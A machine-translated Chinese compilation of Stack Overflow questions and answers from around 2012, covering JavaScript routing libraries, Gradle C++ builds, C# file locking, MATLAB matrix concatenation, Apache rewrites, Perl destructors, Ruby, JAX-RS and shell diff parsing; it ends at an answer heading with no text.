*   链接事件来调用路由，例如：当我点击一个链接时调用上面的路由。（您必须确保在我相信的已定义事件中调用 e.preventDefault，因为这确实是一个应用程序决定，因此您将使用恕我直言的任何库都无法将其抽象出来）

一些相关文档

*   [http://sammyjs.org/docs](http://sammyjs.org/docs)
*   [http://sammyjs.org/docs/routes](http://sammyjs.org/docs/routes)
*   [http://sammyjs.org/docs/events](http://sammyjs.org/docs/events)

路线示例：（来自[http://sammyjs.org/docs/tutorials/json_store_1](http://sammyjs.org/docs/tutorials/json_store_1)）

```
 this.get('#/', function(context) {
    $.ajax({
      url: 'data/items.json',
      dataType: 'json',
      success: function(items) {
        $.each(items, function(i, item) {
          context.log(item.title, '-', item.artist);
        });
      }
    });
  }); 
```

或者类似的东西

```
 this.get('#/', function(context) {
     context.app.swap(''); ///the 'swap' here indicates a cleaning of the view
                              //before partials are loaded, effectively rerendering the entire screen. NOt doing the swap enables you to do infinite-scrolling / appending style, etc. 
     // ...
   }); 
```

当然，其他客户端 MVC 框架也可能是一种选择，它可以消除更多的管道，但在这种情况下可能会过度杀伤力。

一个非常好的（而且仍然是最近的）比较：

[http://codebrief.com/2012/01/the-top-10-javascript-mvc-frameworks-reviewed/](http://codebrief.com/2012/01/the-top-10-javascript-mvc-frameworks-reviewed/) （我自己使用 Spine.js）。

最后，我认为在客户端刷新等中包含我刚才写的一个答案可能很有用，该答案详细介绍了整个最佳实践（如我所见）等。也许你觉得它很有用：

[可访问性和所有这些 JavaScript 框架](https://stackoverflow.com/questions/7370056/accessibility-and-all-these-javascript-frameworks/7371629#7371629)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-07-19T13:15:50.413

我目前在我的一个应用程序中使用[PathJS](http://github.com/mtrpcic/pathjs)。这是我做过的最好的决定。对于您的特定用例，请查看[HTML5 Example](http://mtrpcic.github.com/pathjs/html5_basic.html)。

使示例工作的代码片段（来自源代码）：

```
<script type="text/javascript">
        // This example makes use of the jQuery library.

        // You can use any methods as actions in PathJS.  You can define them as I do below,
        // assign them to variables, or use anonymous functions.  The choice is yours.
        function notFound(){
            $("#output .content").html("404 Not Found");
            $("#output .content").addClass("error");
        }

        function setPageBackground(){
            $("#output .content").removeClass("error");
        }        

        // Here we define our routes.  You'll notice that I only define three routes, even
        // though there are four links.  Each route has an action assigned to it (via the 
        // `to` method, as well as an `enter` method.  The `enter` method is called before
        // the route is performed, which allows you to do any setup you need (changes classes,
        // performing AJAX calls, adding animations, etc.
        Path.map("/users").to(function(){
            $("#output .content").html("Users");
        }).enter(setPageBackground);

       Path.map("/about").to(function(){
            $("#output .content").html("About");
        }).enter(setPageBackground);

       Path.map("/contact").to(function(){
            $("#output .content").html("Contact");
        }).enter(setPageBackground);

        // The `Path.rescue()` method takes a function as an argument, and will be called when
        // a route is activated that you have not yet defined an action for.  On this example
        // page, you'll notice there is no defined route for the "Unicorns!?" link.  Since no
        // route is defined, it calls this method instead.
        Path.rescue(notFound);

        $(document).ready(function(){
            // This line is used to start the HTML5 PathJS listener.  This will modify the
            // `window.onpopstate` method accordingly, check that HTML5 is supported, and
            // fall back to hashtags if you tell it to.  Calling it with no arguments will
            // cause it to do nothing if HTML5 is not supported
            Path.history.listen();

            // If you would like it to gracefully fallback to Hashtags in the event that HTML5
            // isn't supported, just pass `true` into the method.

            // Path.history.listen(true);

            $("a").click(function(event){
                event.preventDefault();

                // To make use of the HTML5 History API, you need to tell your click events to
                // add to the history stack by calling the `Path.history.pushState` method. This
                // method is analogous to the regular `window.history.pushState` method, but
                // wraps calls to it around the PathJS dispatched.  Conveniently, you'll still have
                // access to any state data you assign to it as if you had manually set it via
                // the standard methods.
                Path.history.pushState({}, "", $(this).attr("href"));
            });
        });
    </script> 
```

PathJS 具有路由库的一些最想要的特性：

*   轻的
*   支持 HTML5 History API、'onhashchange' 方法和优雅降级
*   支持根路由、救援方法、参数化路由、可选路由组件（动态路由）和面向切面编程
*   经过良好测试（./tests 目录中提供的测试）
*   兼容所有主流浏览器（在 Firefox 3.6、Firefox 4.0、Firefox 5.0、Chrome 9、Opera 11、IE7、IE8、IE9 上测试）
*   独立于所有第三方库，但与所有第三方库配合得很好

我发现最后一点最有吸引力。你可以在[这里找到它们](https://github.com/mtrpcic/pathjs#features)

希望这个对你有帮助。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-07-13T08:12:29.510

我想建议一个组合

crossroads.js 作为路由器 [http://millermedeiros.github.com/crossroads.js/](http://millermedeiros.github.com/crossroads.js/)

和用于处理浏览器历史记录和哈希 URL 的哈希（带有大量后备解决方案）： [https](https://github.com/millermedeiros/hasher/) ://github.com/millermedeiros/hasher/ （基于[http://millermedeiros.github.com/js-signals/](http://millermedeiros.github.com/js-signals/)）

这仍然需要几行代码（加载 ajax 内容等），但在处理路由时会为您提供负载和其他可能性。

这是一个使用 jQuery 的示例（以上库都不需要 jQuery，我只是懒惰......）

[http://fiddle.jshell.net/Fe5Kz/2/show/light](http://fiddle.jshell.net/Fe5Kz/2/show/light)

**HTML**

```
<ul id="menu">
    <li>
        <a href="foo">foo</a>            
    </li>
    <li>
        <a href="bar/baz">bar/baz</a>
    </li>
</ul>

<div id="content"></div> 
```

**JS**

```
//register routes
crossroads.addRoute('foo', function() {
    $('#content').html('this could be ajax loaded content or whatever');
});

crossroads.addRoute('bar/{baz}', function(baz) {

    //maybe do something with the parameter ...
    //$('#content').load('ajax_url?baz='+baz, function(){
    //    $('#content').html('bar route called with parameter ' + baz);
    //});

    $('#content').html('bar route called with parameter ' + baz);
});

//setup hash handling
function parseHash(newHash, oldHash) {
    crossroads.parse(newHash);
}
hasher.initialized.add(parseHash);
hasher.changed.add(parseHash);
hasher.init();

//add click listener to menu items
$('#menu li a').on('click', function(e) {
    e.preventDefault();
    $('#menu a').removeClass('active');
    $(this).addClass('active');

    hasher.setHash($(this).attr('href'));
});​ 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-07-17T22:10:32.070

你看过[BigShelf 示例 SPA（单页应用程序）吗](http://www.asp.net/single-page-application/spa-samples/sample-bigshelf-application/big-shelf-code)？听起来它涵盖了如何实现您所要求的大部分内容。

它利用 History.js，一个自定义的包装对象来轻松控制导航，称为 NavHistory 和用于点击处理的[Knockout.js 。](http://knockoutjs.com/)

这是一个非常简短的工作流程：首先，您需要初始化一个`NavHistory`包装 history.js 的对象并注册一个回调，该回调在推送状态或哈希更改时执行：

```
var nav = new NavHistory({
    params: { page: 1, filter: "all", ... etc ... },
    onNavigate: function (navEntry) {
        // Respond to the incoming sort/page/filter parameters
        // by updating booksDataSource and re-querying the server
    }
}); 
```

接下来，您将使用可以绑定到链接按钮等的命令定义一个或多个 Knockout.js 视图模型：

```
var ViewModel = function (nav) {
  this.search = function () {
    nav.navigate({ page: 2, filter: '', ... }); // JSON object matching the NavHistory params
  };
} 
```

最后，在您的标记中，您将使用 Knockout.js 将您的命令绑定到各种元素：

```
<a data-bind="click: search">...</a> 
```

链接的资源在解释所有这些如何工作时更加详细。不幸的是，它不是您正在寻找的单一框架，但您会惊讶地发现它是多么容易工作。

*还有一件事，按照 BigShelf 示例，我正在构建的网站完全跨浏览器兼容，IE6+、Firefox、Safari（移动和桌面）和 Chrome（移动和桌面）。*

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-07-13T08:48:22.240

[**`AjaxTCR Library`**](http://ajaxref.com/library/)似乎涵盖了所有基础并包含我以前从未见过的强大方法。它是根据 BSD 许可证（*开源计划*）发布的。

例如，这里有五种**`AjaxTCR.history();`**方法：

> 初始化（onStateChangeCallback，initState）；
> 
> addToHistory(id, data, title, url, options);
> 
> 得到所有（）;
> 
> 获取位置（）；
> 
> enableBackGuard（消息，立即）；

以上**`addToHistory();`**有足够的参数来允许在网站中进行深度哈希链接。

**.com.cookie()**、**.storage()**和**.template()**更吸引眼球的方法提供了足够多的方法来处理任何***会话数据***需求。

有据可查的[**AjaxTCR API 网页**](http://ajaxref.com/lib/docs/)包含大量信息，可下载文档以供引导！

**状态更新：**
该网站还有一个[**示例网页部分**](http://ajaxref.com/examples/)，包括可下载的**.zip 文件**，其中包含可供使用的**前端**（*客户端*）和**后端**（*服务器*）项目文件。

值得注意的是以下***即用型***示例：
[**单向 Cookie**](http://ajaxref.com/ch2/onewaycookie.html)
[**HttpOnly Cookies**](http://ajaxref.com/ch7/cookie.html)
[**History Stealing**](http://ajaxref.com/ch7/history.html)
[**History Explorer**](http://ajaxref.com/ch9/historyexplorer.html)

还有很多其他示例完善了使用他们的许多 API 方法的过程，使任何小的学习曲线更快地完成。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2012-07-13T07:55:12.917

### 几个建议

*   [ExtJs](http://www.sencha.com/products/extjs/)，请参阅他们的[历史示例](http://dev.sencha.com/deploy/ext-4.0.2a/examples/history/history.html)，这里是[文档](http://docs.sencha.com/ext-js/4-0/#/api/Ext.util.History)。
*   [YUI 浏览器历史管理器](http://developer.yahoo.com/yui/history/)。
*   [jQuery BBQ](http://benalman.com/projects/jquery-bbq-plugin/)似乎提供了比 jQuery.hashcode 更高级的功能集。
*   [ReallySimpleHistory](http://code.google.com/p/reallysimplehistory/)也可能会有所帮助，尽管它已经很旧并且可能已经过时了。

***注意：** ExtJs History 已[扩展以优化对`add()`](http://existdissolve.com/2011/08/extjs-4-a-modified-ext-util-history/).*

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2015-10-14T15:31:01.170

# PJAX 是您描述的过程。

当用户将鼠标悬停在链接上时，更高级的 pjax 技术甚至会开始预加载内容。

这是一个很好的 pjax 库。 [https://github.com/MoOx/pjax](https://github.com/MoOx/pjax)

您标记需要在后续请求中更新的容器：

```
new Pjax({ selectors: ["title", ".my-Header", ".my-Content", ".my-Sidebar"] }) 
```

所以在上面，只有`title`, `.my-header`,`.my-content`和`.my-sidebar`将被替换为来自 ajax 调用的内容。

## 需要注意的事项

注意您的 JS 如何加载和检测页面何时准备就绪。javascript 不会在新页面上重新加载。出于同样的原因，还要注意何时调用任何分析调用。

# c++ - 在 gradle 中配置 cpp 源

> ID：11427262
> 
> 赞同：7
> 
> 时间：2012-07-11T07:03:26.840
> 
> 标签：c++, build-automation, gradle

我已经在 Qt 之上建立了一个项目（所以源代码是用 C++ 编写的），我想尝试使用 Gradle 来自动构建它。我花了一些时间来了解配置多项目构建的细节（有一个可执行文件和两个库），现在我试图告诉插件`cpp-exe`和`cpp-lib`我的源代码树的结构。

我已经设置了一个应该打印所有源集的任务（应该至少有默认的，对吧？）它看起来像这样：

```
task projectinfo {
description = "Informations about the current project"
group = INFORMATIONS_GROUP

doFirst {
    task -> print ("""${task.project.sourceSets.all}""")
} 
```

如果我运行此任务，Gradle 会告诉我该项目没有属性“sourceSets”。[该插件的文档](http://www.gradle.org/docs/current/userguide/cpp.html#N147EC)告诉我可以自定义源位置，但不能自定义。

所以我的问题是：如何告诉 Gradle`cpp`插件使用哪些源文件。如果`cpp`除了它的 API 文档和 Gradle 用户指南之外还有关于该插件的任何文档，那也会有所帮助。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-27T00:53:46.387

看看[Adam Murdoch](https://github.com/adammurdoch/native-platform)对 Gradle 的[“cpp 插件”](http://gradle.org/docs/current/userguide/cpp.html)的使用。我相信他是主要的 Gradle 提交者之一，所以他应该比任何人都知道如何更好地使用它：

从[native-platform/build.gradle发挥作用](https://github.com/adammurdoch/native-platform/blob/master/build.gradle)

```
cpp {
    sourceSets {
        main {
            source.exclude 'curses.cpp'
        }
        curses {
            source.srcDirs = ['src/main/cpp']
            source.include 'curses.cpp'
            source.include 'generic.cpp'
            source.include 'generic_posix.cpp'
        }
    }
}

Then, within the 'libraries' node, refer to all/any combination of architecture and source sets:

sourceSets << cpp.sourceSets.main
sourceSets << cpp.sourceSets.curses 
```

我自己没有太长时间查看它，但看起来他定义了许多基于操作系统架构的源代码，包括组合并将它们存储在variables**变量**中。然后他将它们处理成平台 JAR（我实际上还没有运行构建，也许我应该）。

另外，看看[https://github.com/rklaren/GradleJNI](https://github.com/rklaren/GradleJNI)，它使用[cpp 插件](http://gradle.org/docs/current/userguide/cpp.html)，但看起来有点面向 Windows。

**更新**- 我还找到了[https://github.com/alkemist/gradle-cpp-demo](https://github.com/alkemist/gradle-cpp-demo)，其中有一个构建可执行文件的“cpp-exe”插件示例。

# c# - 有没有办法以编程方式检查 Excel 文件是否已打开

> ID：11427265
> 
> 赞同：0
> 
> 时间：2012-07-11T07:03:36.537
> 
> 标签：c#, excel, office-interop

我想检查一个特定的 Excel 文件是否已经打开。否则，当我在 C# 程序中重新打开同一个文件时，它会以只读格式打开。有什么方法可以确定文件是否已经打开？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T08:02:36.510

If the file if opened by another program this code can help you figure it out, but you won't be able to open it

```
<!-- language: c# -->
protected virtual bool IsFileLocked(FileInfo file)
{
FileStream stream = null;

    try
    {
        stream = file.Open(FileMode.Open, FileAccess.ReadWrite, FileShare.None);
    }
    catch (IOException)
    {
        //the file is unavailable because it is:
        //still being written to
        //or being processed by another thread
        //or does not exist (has already been processed)
        return true;
    }
    finally
    {
        if (stream != null)
            stream.Close();
    }

    //file is not locked
    return false;
} 
```

(BUt you can't do anything with it, the file must be closed from the program, which opened it)

# matlab - A=[x; 是什么？y'] 在 Matlab 中是什么意思？

> ID：11427271
> 
> 赞同：4
> 
> 时间：2012-07-11T07:03:54.710
> 
> 标签：matlab

我正在学习 Matlab，我看到一行我不明白：

`A=[x; y']`

这是什么意思？' 通常表示转接，但我不知道是什么；表示在向量中。你能帮助我吗？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-07-11T07:13:32.527

[ ] 表示创建矩阵。
这 ; 表示第一个向量在第一行，第二个向量在第二行。
' 表示转座子。
例子：

```
>> x = [1,2,3,4]
x = 
    1 2 3 4

>> y = [5;6;7;8]
y =
    5
    6
    7
    8

>> y'
ans =
    5 6 7 8

>> A = [x;y']
A = 
    1 2 3 4
    5 6 7 8 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-07-11T07:08:03.897

`[x y]`表示向量的水平 cat，而`[x;y]`表示垂直。

例如（水平猫）：

```
x = [1
     2
     3];

y = [4 
     5 
     6];

[x y] =  [1 4
          2 5 
          3 6]; 
```

（垂直猫）：

```
 x = [1 2 3];
  y = [4 5 6];

 [x; y] = 
      [1 2 3;
       4 5 6]; 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-07-11T09:21:04.187

需要明确的是，在 MATLAB`'`中是*复共轭*转置。如果你想要非共轭转置，你应该使用`.'`.

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-07-11T07:07:41.933

当从其他矩阵创建矩阵时，它表示行的结束。

例如

```
X = [1 2];
Y = [3,4]';
A = [X; Y'] 
```

给出一个矩阵

```
A = [ 1 2 ]
    [ 3 4 ] 
```

这称为垂直连接，基本上意味着从其他矩阵（如上面的示例）以逐行方式形成矩阵。是的，您对`'`指示转置运算符是正确的。作为另一个示例，您可以使用它来创建转置向量，如下所示

```
Y = [1 2 3 4 5];
X = [1; 2; 3; 4; 5];
Y = Y'; 
```

比较上面的内容，您会看到 X 现在等于 Y。希望这会有所帮助。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-07-11T07:11:21.980

让我们设置 xm*n（m 行和 n 列）的大小和 yn*p 的大小。那么A就是x的垂直串联和y(算子')的转置形成的矩阵，它的大小是(m+p)*n。水平连接用逗号而不是半列完成。这个符号是函数 vertcat 的一个很好的简写。有关详细信息，请参阅[http://www.mathworks.fr/help/techdoc/math/f1-84864.html](http://www.mathworks.fr/help/techdoc/math/f1-84864.html)

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2012-07-11T07:30:38.320

分号 ' ; ' 用于开始新行。

例如 x=[1 2 3; 4 5 6; 7 8 9] 表示

```
    x= 1 2 3
       4 5 6
       7 8 9

```

所以如果你取 x=[1 2 3; 4 5 6] 和 y=[7 8 9]'

那么z=[x; y'] 表示

```
    z= 1 2 3
       4 5 6
       7 8 9

```

# apache - 如果 PHP 文件被命名为重写模式，则 mod_rewrite 规则被破坏

> ID：11427272
> 
> 赞同：0
> 
> 时间：2012-07-11T07:03:55.293
> 
> 标签：apache, mod-rewrite, url-rewriting

我想重定向所有请求，例如：

```
/xml/doSomething?arg=value 
```

到：

```
/xml.php?action=doSomething&arg=value 
```

我尝试了这个简单的规则：

```
RewriteEngine
RewriteBase /
RewriteRule ^xml/([^/]+)[/]? xml.php?action=$1 [R=302,L,QSA] 
```

但它不起作用。仅使用参数`xml.php`执行。`arg=value`问题是有一个名为 的文件`xml.php`，作为我规则的第一部分。事实上，如果我将规则更改为：

```
RewriteRule ^asd/([^/]+)[/]? xml.php?action=$1 [R=302,L,QSA] 
```

我指出：

```
/asd/doSomething?arg=value 
```

我被正确重定向到：

```
/xml.php?action=doSomething&arg=value 
```

一个名为我的重写模式第一部分的 PHP 文件的存在如何破坏这一切？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:44:03.760

我解决了。问题是`Options MultiViews`我的虚拟主机配置中有问题。我不知道这个选项：

> 多视图搜索由`MultiViews Options`. 如果服务器收到请求`/some/dir/foo`并且`/some/dir/foo`不*存在*，则服务器读取目录查找所有名为`foo.*`

这只是解释了为什么我的规则不起作用。

# sql-server - SQL Server 2008 - 链接的 Firebird 服务器 - 无法正常工作

> ID：11427278
> 
> 赞同：1
> 
> 时间：2012-07-11T07:04:08.373
> 
> 标签：sql-server, sql-server-2008, odbc, firebird, linked-server

我有一个 SQL Server 2008。我使用`Firebird/InterBase(r) driver`.

连接工作正常。

然后我在 SQL Server 2008 中使用`Microsoft OLE DB Provider for ODBC diver`.

一切似乎都很好。我可以使用从表中提取数据

```
SELECT * FROM OPENQUERY(LINKEDSERVERNAME, 'SELECT * FROM TABLENAME') 
```

成功。

我的问题是远程存储过程调用。在 Firebird 端，有一个存储过程，它有一个输入参数。有时我得到结果，但大多数时候我得到一个错误。我不确定为什么会发生这种情况，但我对错误了解不多。

我这样调用程序：

```
SELECT * FROM OPENQUERY(LINKEDSERVERNAME, 'SELECT * FROM GET_DOCUMENT_S(05011002766916)' 
```

它要么我得到结果（1 行），要么我得到一个错误。对于 id 05011002766916i 总是得到结果，但对于某些 id 我从来没有得到结果，即使 Firebird 管理员声称相同的过程调用在他的客户端上正常返回结果。

以下是我得到的错误：

> 消息 7399，级别 16，状态 1，第 1 行
> 链接服务器“LINKEDSERVERNAME”的 OLE DB 提供程序“MSDASQL”报告了错误。提供商没有提供有关该错误的任何信息。
> 消息 7321，级别 16，状态 2，第 1 行
> 准备查询“SELECT * FROM GET_DOCUMENT_S(04170200133A120)”以针对链接服务器“LINKEDSERVERNAME”的 OLE DB 提供程序“MSDASQL”执行时发生错误。

或者：

> 消息 7399，级别 16，状态 1，第 1 行
> 链接服务器“LINKEDSERVERNAME”的 OLE DB 提供程序“MSDASQL”报告了错误。提供商没有提供有关该错误的任何信息。
> 消息 7330，级别 16，状态 2，第 1
> 行无法从链接服务器“LINKEDSERVERNAME”的 OLE DB 提供程序“MSDASQL”获取行。

有人可以解释一下可能是什么问题，因为目前我不知道它是 ODBC、链接服务器还是 Firebird 端的问题......

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-02-07T13:48:58.303

问题出在火鸟方面。我使用了 Flamerobin 客户端，它产生了 IBPP:SQLException

# perl - DESTROY 以意外的顺序调用

> ID：11427281
> 
> 赞同：8
> 
> 时间：2012-07-11T07:04:20.430
> 
> 标签：perl, memory-management

我开始注意到一些奇怪的事情[`Scope::Guard`](http://search.cpan.org/~chocolate/Scope-Guard-0.20/lib/Scope/Guard.pm)。

*   如果我将一个`$guard`变量取消定义为 sub 中的最后一条语句，则守卫的 sub 被调用的时间比我预期的要晚。
*   如果我不取消定义它，或者如果我在 之后做某事（任何事情）`undef $guard`，它会在引用超出记录的范围时被调用。我想知道为什么。

代码也可以在[这里找到](https://gist.github.com/3088551)

```
my $sClass = 'SGuard';
# Uncomment to use Scope::Guard instead:
# use Scope::Guard; $sClass = 'Scope::Guard';

package SGuard;
sub new {
    my ($class, $sub) = @_;
    return bless { sub => $sub }, $class;
}

sub DESTROY {
    my ($self) = @_;
    $self->{sub}->();
}

package main;
sub mySub {
    my $mySubGuard = $sClass->new(sub { 
         print "shouldDestroyFirst\n" 
    });

    # Do something - any no-op will do.
    undef;

    # Comment out this line and it works
    undef $mySubGuard;

    # Or uncomment the next undef line and it works. Any statement(s) or
    # no-ops will do but we test the return value of mySub to make sure it
    # doesn't return a reference, so undef...

    # undef;
}
{
    my $scopeGuard = $sClass->new(sub { 
        print "shouldDestroyLast\n" 
    });

    # Check that mySub returns undef to ensure the reference *did* go out
    # of scope
    printf "mySub returned a %sdefined value\n", defined mySub() ? "" : "un";
}
print "done\n"; 
```

在代码中，我制作了自己的穷人[`Scope::Guard`](http://search.cpan.org/~chocolate/Scope-Guard-0.20/lib/Scope/Guard.pm)（`SGuard`上面），只是为了使示例尽可能简单。您还可以使用[`Scope::Guard`](http://search.cpan.org/~chocolate/Scope-Guard-0.20/lib/Scope/Guard.pm) 并获得至少对我来说出乎意料的完全相同的结果。

我期望`$mySubGuard`内部`mySub()`应该首先被销毁`$scopeGuard`，调用的范围内`mySub()`应该最后被销毁。所以得到如下输出：

```
 shouldDestroyFirst
 mySub returned a undefined value
 shouldDestroyLast
 done 
```

如果我`undef $mySubGuard`在 mySub 中使用 line，我会得到以上输出。如果我不在`undef $mySubGuard`mySub 中使用 line，我会得到以下输出：

```
mySub returned a undefined value
shouldDestroyLast
shouldDestroyFirst
done 
```

因此，看起来在外部作用域的本地变量被销毁后， `$mySubGuard`from`mySub()`被销毁了。

为什么行为会因为我取消定义一个即将超出范围的变量而有所不同？为什么事后是否做某事很重要？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T13:20:53.877

看起来这是某种优化。如果你`undef`是一个变量并且之后不使用它，它会被放入某种队列中以检查魔法或其他东西。但是，如果你之后做任何事情，它就会立即执行 DESTROY。

此外，可能存在一个错误，因为您`undef`在“返回上下文”中使用它，因此存在正在检查某些内容的变量的副本。也许 Perl 保留了一个引用，它稍后会清理它和调用范围的结尾。

您还会注意到，在 -ing 守卫之后的任何*其他*语句都会`undef`导致预期的行为。包括 PBP 推荐的以`return`. Damian 的明确原因之一是它避免了意想不到的副作用。

问题解决了：就像`undef`守卫一样容易，你可以直接运行它的处理程序。不要将守卫取消定义为子的最后（隐式返回）语句。有理由显式取消定义守卫，例如您想立即运行它们的处理程序*以进行*进一步处理。

这是令人困惑和意想不到的，但绝对不应该出现在完成或标准化的代码中。

# ruby - 比较rails中两个对象数组的最佳方法

> ID：11427282
> 
> 赞同：3
> 
> 时间：2012-07-11T07:04:22.310
> 
> 标签：ruby, comparison

例如，我有两个对象数组：

```
a1 = [obj1, obj2 , obj3]
a2 = [obj4, obj5, obj6] 
```

每个数组都有同一类的不同对象。我想`obj1.att == obj4.att`在一次迭代中检查它们是否具有相同的属性值（）。

`a1.each`将对单个数组进行迭代。我不想使用`for`或`while`循环。我想要一种轨道方式来做到这一点。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-11T07:49:33.250

我想在迭代之前检查数组大小是否匹配是有意义的：

```
same_att = a1.size == a2.size && a1.map(&:att) == a2.map(&:att) 
```

同样的想法，一个惰性实现（仅当数组中有很多元素时）：

```
same_att = a1.size == a2.size && a1.lazy.zip(a2).all? { |x, y| x.att == y.att } 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-11T07:14:12.603

尝试关注

```
a1.map(&:att) == a2.map(&:att) 
```

已编辑记住以下内容

```
[1,2,3] == [1,2,3]  #true 
```

和

```
[1,2,3] == [2,3,1]  #false 
```

因此它只会`true`在`att attribute of obj1, obj4 AND obj2, obj5 AND obj3, obj6 are same.`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:19:06.267

```
a1.each {|i| a2.sel­ect {|k|  k.att == i.att }} 
```

# java - 在 jax-rs Web 服务中使用 java 接口的好处？

> ID：11427283
> 
> 赞同：2
> 
> 时间：2012-07-11T07:04:27.783
> 
> 标签：java, web-services, cxf, jax-rs

我对这个网络服务世界很陌生。我目前正在探索基于 Apache CXF 的 JAX-RS Web 服务。好吧，在与我的一些对 Web 服务有相当好的想法的前辈交谈时，他告诉我，将接口公开为 Web 服务而不是实现类总是一个好习惯。但我认为我并不完全理解这种方法的好处。有人可以解释一下为什么基于接口的方法应该比普通方法更好吗？

另外，有人可以指向一个链接，它可以向我展示如何从头开始构建基于接口的 jax-rs Web 服务，而不仅仅是将现有的更改为接口形式。！！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-11T08:28:07.257

这是OOD的基础之一。这是一种很好的做法，因为您将设计与实现分开，例如。

> 现在您有了基于 JAX-RS 的 WebServices。将来您可能不得不扩展您的 JAX-WS 实现系统。然后您不必创建一个新类，而是基于相同的设计（多态）创建另一个实现。

当您创建松耦合系统时，您可以创建灵活的应用程序，易于测试和扩展。

通过链接： [http ://dhruba.name/2008/12/08/rest-service-example-using-cxf-22-jax-rs-10-jaxb-and-spring/](http://dhruba.name/2008/12/08/rest-service-example-using-cxf-22-jax-rs-10-jaxb-and-spring/)

# rubygems - Rubygem 通知 Rake 任务完成

> ID：11427285
> 
> 赞同：0
> 
> 时间：2012-07-11T07:04:29.790
> 
> 标签：rubygems, rake, rake-task

在某个 Rake 任务完成后，是否有任何 Rubygem 可以发送电子邮件或推送通知？最好有一个，因为我通常执行多任务并忘记检查 Rake 任务的进程是否完成。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T16:54:26.540

假设您使用的是 Mac，请使用 Growl (http://growl.info/) 和 growl gem (https://rubygems.org/gems/growl)。您将需要安装 growlnotify extra (http://growl.info/extras.php/#growlnotify) 以从命令行启用咆哮通知——这是 gem 所依赖的。

此时，您可以在 Rakefile 中添加一些 Ruby 来通知自己。例子：

```
notification = Growl.new
notify_ok 'Deployment successful' 
```

希望有帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-09T21:03:25.773

我发现这更容易（ubuntu）：

```
rake whatever_task; notify-send "whatever_task finished with status $?" 
```

在 OSX 上，你会想要使用`growlnotify`而不是`notify-send`（我认为）

# shell - 使用 diff 在 csv 中查找多个缺失的行

> ID：11427292
> 
> 赞同：0
> 
> 时间：2012-07-11T07:05:03.170
> 
> 标签：shell, unix, csv, grep, diff

这个答案解决了我的问题的一部分： [Threadlink](https://stackoverflow.com/questions/11358745/find-missing-lines-in-csv-using-shell-script) ，但我的问题的一个重要部分没有解决！

使用后

```
diff a.csv b.csv | grep -E -A1 '^[0-9]+d[0-9]+$' | grep -v '^--$' | sed -n '0~2 p' | sed -re 's,^< (.*)$,\1,g' 
```

有几次我发现了一些东西。有时会删除多个后续行。如果只删除了一行，则会发现如下内容：

`3663d3661`

对于多行，它是：

`3724,3725d3718`

所以我把`diff`电话改为：

```
diff a.csv b.csv | grep -E -A1 '^[0-9]+\,*[0-9]*d[0-9]+$' | grep -v '^--$' | sed -n '0~2 p' | sed -re 's,^< (.*)$,\1,g' 
```

这适用于多个已删除行中的第一行。

我的问题是：在这种情况下，我怎样才能获得所有删除行（可能是以下 5 行）？我必须在`diff`通话中进行哪些更改？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T09:53:34.380

```
diff a.csv b.csv | sed -n '/^[0-9]\+d[0-9]*/,/^[0-9]\+[^d]*$/{/^[0-9]\+/d;s/^< //;p}' 
```

会这样做。

```
/^[0-9]\+d[0-9]*/,/^[0-9]\+[^d]*$/ 
```

将找到被删除的字符串范围

```
/^[0-9]\+/d 
```

将全部删除`6842d6844,6772`

```
s/^< // 
```

将替换所有`<`行首

并将`p`打印该行。

# tomcat - 什么是主备集群模型

> ID：11427295
> 
> 赞同：0
> 
> 时间：2012-07-11T07:05:12.967
> 
> 标签：tomcat, webserver, cluster-computing

什么是主备集群模型？

我正在阅读：[http](http://www.datadisk.co.uk/html_docs/java_app/tomcat6/tomcat6_clustering.htm) : //www.datadisk.co.uk/html_docs/java_app/tomcat6/tomcat6_clustering.htm 它在第 4 段提到了它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:51:24.093

这是集群高可用的负载均衡模式。

[Google Books](http://books.google.co.in/books?id=c022aMuJBU4C&lpg=PA460&ots=vZrHFa_zVH&dq=One%20machine%20is%20designated%20as%20the%20master%20server%20and%20processes%20incoming%20requests.%20The%20rest%20of%20the%20machines%20are%20backup%20servers&pg=PA460#v=onepage&q&f=true)上的Professional Tomcat (2004 Edition)有一个解释 - 如下所示。

![主备份](../Images/df5ae28002d283e3f39f90396ac9928d.png)

# html - 如何将此html表格转换为div？

> ID：11427296
> 
> 赞同：-1
> 
> 时间：2012-07-11T07:05:13.527
> 
> 标签：html, css

谁能建议我如何将下面的 html 表转换为 div？我试图做一些谷歌搜索，但无法找到具体的例子。如果有人可以为我提供一些示例代码或指出正确的方向，我将不胜感激。

谢谢

```
<table width="100%" border="0" cellspacing="0" cellpadding="0">
            <tbody>   

                <tr>
                    <td colspan="3">
                        List of news
                     </td>
                </tr> 
                <tr>
                    <td width="20%">
                        Title
                    </td>
                    <td width="5%">
                        :
                    </td>
                    <td width="75%">
                        Name of title
                    </td>
                </tr>
                <tr>
                    <td valign="top">
                        Description
                    </td>
                    <td valign="top">
                        :
                    </td>
                    <td valign="top">
                        Content of description
                    </td>
                </tr>
            </tbody>
            </table> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:42:56.230

